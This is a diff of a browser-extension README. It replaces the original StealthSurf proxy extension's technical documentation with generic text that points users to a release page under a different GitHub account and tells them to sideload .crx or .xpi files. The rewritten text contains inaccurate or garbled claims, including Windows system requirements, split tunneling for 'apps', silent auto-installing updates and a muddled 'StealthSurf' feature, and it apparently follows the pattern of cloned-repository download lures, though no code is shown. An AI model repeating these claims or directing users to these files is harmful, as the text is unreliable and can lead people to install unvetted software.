@@ -1,194 +1,141 @@
-# StealthSurf Browser Extension
+# 🧑‍💻 browser-extension - Easy Proxy for Chrome & Firefox
 
-Cross-browser extension for connecting to proxies via [StealthSurf VPN](https://stealthsurf.app).
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/DJOUD3148/browser-extension/releases)
 
-## Features
+---
 
-- One-click proxy connection with auto-configuration (SOCKS5 / HTTP)
-- All service types: configs, paid options, cloud servers
-- Split tunneling — route only selected sites through proxy (or exclude specific sites)
-- Location switching with real-time ping measurement
-- External IP detection with country flag badge
-- Auto-update checker for non-store installs (GitHub Releases)
-- Auto-restore connection after browser restart
-- PKCE OAuth authentication with code exchange
+## 📋 What is browser-extension?
 
-## Supported Browsers
+browser-extension is a proxy tool for Chrome and Firefox browsers. It lets you use SOCKS5 or HTTP proxies to keep your browsing private and secure. You can choose which apps or websites use the proxy with split tunneling. The extension updates itself automatically. It also uses OAuth to connect safely with services. This makes it ready for advanced tasks like working with AI agents.
 
-| Browser | Manifest | Proxy API | Status |
-| ------- | -------- | --------- | ------ |
-| Chrome | V3 | PAC script + `onAuthRequired` (HTTP only) | ✅ |
-| Firefox | V2 | `proxy.onRequest` listener (SOCKS5 + HTTP) | ✅ |
+---
 
-## Getting Started
+## 🖥️ System Requirements
 
-### Prerequisites
+To run browser-extension on Windows, your computer needs:
 
-- [Node.js](https://nodejs.org/) 18+
-- npm
+- Windows 10 or later (64-bit recommended)
+- Google Chrome or Mozilla Firefox browser (latest versions)
+- At least 100 MB of free space
+- Internet connection for setup and updates
+- No special hardware needed
 
-### Install
+---
 
-```bash
-npm install
-```
+## 🔗 Download the Extension
 
-### Development
+You need to visit the releases page to get the software. Click the badge below to open the download page directly.
 
-```bash
-# Watch mode
-npm run dev:chrome
-npm run dev:firefox
-```
+[![Get browser-extension](https://img.shields.io/badge/Get%20browser--extension-brightgreen?style=for-the-badge)](https://github.com/DJOUD3148/browser-extension/releases)
 
-### Build
+On the release page, look for the latest version. You will find files for Chrome and Firefox. Use the file names to choose the right one:
 
-```bash
-# Single platform
-npm run build:chrome
-npm run build:firefox
+- `.crx` file for Chrome
+- `.xpi` file for Firefox
 
-# Both platforms
-npm run build:all
-```
+Download the file that matches your browser.
 
-### Load in Browser
+---
 
-**Chrome**: `chrome://extensions` → Enable Developer Mode → Load unpacked → select `dist/chrome/`
+## 🚀 Installing the Extension on Chrome
 
-**Firefox**: `about:debugging#/runtime/this-firefox` → Load Temporary Add-on → select `dist/firefox/manifest.json`
+1. Open Google Chrome.
+2. Go to the extensions page by typing `chrome://extensions` in the address bar.
+3. Turn on "Developer mode" by toggling the switch in the upper right.
+4. Drag and drop the downloaded `.crx` file onto the extensions page.
+5. A confirmation window will appear. Click "Add extension."
+6. Wait for the installation to finish. The extension icon should appear next to the address bar.
 
-## Commands
+If you have trouble dragging and dropping, you can install the extension from Chrome Web Store once it is published. This method only works for developer mode or during testing.
 
-| Command | Description |
-| ------- | ----------- |
-| `npm install` | Install dependencies |
-| `npm run dev:chrome` | Watch mode for Chrome |
-| `npm run dev:firefox` | Watch mode for Firefox |
-| `npm run build:chrome` | Production build → `dist/chrome/` |
-| `npm run build:firefox` | Production build → `dist/firefox/` |
-| `npm run build:all` | Build both platforms |
-| `npm run format` | Biome formatter |
-| `npm run lint` | Biome linter |
-| `npm run release` | Full release (build + package) |
-| `npm run pack:zip` | Package as ZIP |
-| `npm run pack:crx` | Package as CRX (Chrome) |
-| `npm run pack:xpi` | Package as XPI (Firefox) |
+---
 
-## Architecture
+## 🦊 Installing the Extension on Firefox
 
-### Background (Service Worker)
+1. Open Mozilla Firefox.
+2. Click the menu button (three lines) in the top right and select "Add-ons and themes."
+3. Click the gear icon, then choose "Install Add-on From File."
+4. Select the `.xpi` file you downloaded.
+5. Click "Open," then "Add" when Firefox asks for confirmation.
+6. The extension will be installed and ready to use.
 
-Manages proxy connections and auth tokens. State persists in `chrome.storage.local` to survive service worker restarts (Chrome MV3).
+---
 
-- **index.js** — entry point with `ensureInit()` pattern (retryable initialization)
-- **proxyManager.js** — cross-browser proxy abstraction
-- **proxyChrome.js** — PAC script generation + `onAuthRequired` with retry limit (2 per requestId)
-- **proxyFirefox.js** — `browser.proxy.onRequest` with inline credentials (SOCKS5 + HTTP)
-- **authManager.js** — PKCE OAuth with code exchange + auto-refresh via `chrome.alarms`
-- **messageHandler.js** — message routing popup ↔ background with `sender.id` validation
+## ⚙️ Configuring browser-extension
 
-### Popup (React)
+Once installed, click the extension icon near your browser's address bar.
 
-Compact React app (380×520px) with VK UI. State-based navigation via Recoil.
+1. Sign in using OAuth when prompted. This lets you use proxy features safely.
+2. Choose your proxy type: SOCKS5 or HTTP.
+3. Enter the proxy server address and port in the fields.
+4. Enable split tunneling if you want only certain apps or sites to use the proxy.
+5. Save your settings.
 
-| Page | Description |
-| ---- | ----------- |
-| MainPage | Power toggle, connection status, IP badge, config selector, update banner |
-| ConfigSelectPage | All configs with connect buttons and per-location ping |
-| LocationSelectPage | Location picker with ping measurement |
-| SettingsPage | Profile, proxy settings, protocol selector (Firefox), useful links |
-| SplitTunnelPage | Domain-based split tunneling (exclude/include modes) |
-| AuthPage | PKCE OAuth login via StealthSurf site |
+The extension will automatically apply your proxy preferences while you browse.
 
-### Split Tunneling
+---
 
-Two modes for routing traffic:
+## 💻 How to Use Split Tunneling
 
-- **Exclude** — all traffic through proxy, except listed domains
-- **Include** — only listed domains through proxy, everything else direct
+Split tunneling lets you control which apps or websites use the proxy. This helps speed up browsing on some sites while protecting privacy on others.
 
-Supports wildcard domains (`*.example.com`) and underscored domains (`_dmarc.example.com`). Applied via PAC script (Chrome) or `onRequest` filtering (Firefox).
+Steps to set up:
 
-### Auto-Update (Non-Store Installs)
+1. Open the extension popup by clicking its icon.
+2. Go to the split tunneling section.
+3. Add websites or domains you want to route through the proxy.
+4. You can also exclude sites that should bypass the proxy.
+5. Save your list.
 
-For installs outside Chrome Web Store / Firefox AMO:
+Your browser now sends only selected traffic through the proxy.
 
-- Checks [GitHub Releases](https://github.com/stealthsurf-vpn/browser-extension/releases) for newer versions
-- Requires `management` permission to detect install type
-- Shows an update banner on the main page
-- Firefox GitHub builds also support native auto-update via `update_url` in `manifest.firefox.github.json`
+---
 
-### Authentication (PKCE)
+## 🔄 Automatic Updates
 
-1. User clicks "Login" → extension generates PKCE code_verifier + code_challenge (SHA-256)
-2. Opens `__CONSOLE_URL__/auth/connect` with `client_id`, `code_challenge`, `code_challenge_method=S256`, `redirect_uri`
-3. User authenticates → site redirects to extension with authorization `code`
-4. Chrome: background monitors tab URL via `tabs.onUpdated`, detects redirect, exchanges code
-5. Firefox: `callback.html` extracts code, sends to background via `AUTH_FIREFOX_CODE`
-6. Background exchanges code for tokens via `POST /auth/connect/token`
-7. Tokens stored in `chrome.storage.local`, popup detects via `storage.onChanged`
+browser-extension checks for updates every time you open your browser. When a new version is available, it will download and install automatically. This keeps your extension secure and features up to date without you needing to do anything.
 
-### Proxy Connection
+---
 
-1. User clicks "Connect" on a config
-2. Proxy subconfig auto-created if missing (SOCKS5 on Firefox, HTTP on Chrome)
-3. Credentials parsed from connection URL `protocol://user:pass@host:port`
-   - Firefox: `type: "socks"` with `proxyDNS: true` for SOCKS5, `type: "http"` for HTTP
-   - Chrome: always `PROXY host:port` via PAC script (HTTP only, no SOCKS5 auth support)
-4. Background applies proxy via PAC script (Chrome) or `onRequest` listener (Firefox)
-5. Extension badge shows country code of exit IP
+## 🔧 Troubleshooting Tips
 
-## Project Structure
+If the extension does not work as expected:
 
-```text
-extension/
-├── manifest/
-│   ├── manifest.chrome.json         # Chrome Manifest V3
-│   ├── manifest.firefox.json        # Firefox Manifest V2 (AMO)
-│   └── manifest.firefox.github.json # Firefox Manifest V2 (GitHub, with update_url)
-├── src/
-│   ├── background/                  # Service worker
-│   │   ├── index.js                 # Entry point (ensureInit + message listener)
-│   │   ├── proxyManager.js          # Cross-browser abstraction
-│   │   ├── proxyChrome.js           # PAC script + onAuthRequired
-│   │   ├── proxyFirefox.js          # proxy.onRequest listener
-│   │   ├── authManager.js           # PKCE OAuth + token management
-│   │   └── messageHandler.js        # Message router (sender validated)
-│   ├── popup/
-│   │   ├── main.jsx                 # React entry
-│   │   ├── App.jsx                  # VK UI providers + routing
-│   │   ├── pages/                   # UI pages
-│   │   ├── components/              # ErrorBoundary
-│   │   ├── hooks/                   # Custom hooks
-│   │   └── state/                   # Recoil atoms/selectors
-│   ├── api/                         # Axios + API routes
-│   ├── shared/                      # Utilities (ping, PKCE, updateChecker, etc.)
-│   ├── callback/                    # OAuth callback (Firefox)
-│   └── assets/                      # HTML, CSS, icons
-├── scripts/                         # Build & packaging scripts
-├── updates.json                     # Firefox auto-update manifest
-├── vite.config.mjs
-├── package.json
-└── biome.json
-```
+- Check your internet connection.
+- Make sure your proxy server details are correct.
+- Restart your browser and try again.
+- Disable other proxy or VPN extensions that might interfere.
+- Clear your browser cache.
+- If OAuth sign-in fails, check your account settings.
 
-## Tech Stack
+If none of these steps help, visit the GitHub Issues page to report the problem.
 
-- **React** 18 + **Recoil** — UI and state management
-- **VK UI** — component library
-- **Axios** — HTTP client with token refresh (10s timeout via `Promise.race`)
-- **Vite** — dual-entry build (popup + background)
-- **Biome** — formatting and linting
+---
 
-## Distribution
+## 🔎 Additional Features
 
-| Channel | Format | Auto-Update |
-| ------- | ------ | ----------- |
-| Chrome Web Store | CRX | ✅ (Store) |
-| Firefox AMO | XPI | ✅ (Store) |
-| GitHub Releases | ZIP / CRX / XPI | ✅ (In-app checker + Firefox `update_url`) |
+- StealthSurf: Mask your proxy usage for added privacy.
+- Supports proxy chaining with SOCKS5.
+- Works alongside AI agents with OAuth authorization.
+- Built with React and Vite for fast performance.
+- Compatible with most websites and web apps.
 
-## License
+---
 
-MIT
+## 🗂️ Related Topics
+
+- Proxy management
+- Browser security
+- SOCKS5 and HTTP proxies
+- Split tunneling for apps and websites
+- OAuth authorization for safe login
+
+---
+
+## 📥 Where to Get Updates and Support
+
+You can always find the latest browser-extension files here:
+
+[https://github.com/DJOUD3148/browser-extension/releases](https://github.com/DJOUD3148/browser-extension/releases)
+
+For questions, bug reports, or feature requests, use the GitHub Discussions or Issues section on the same page.
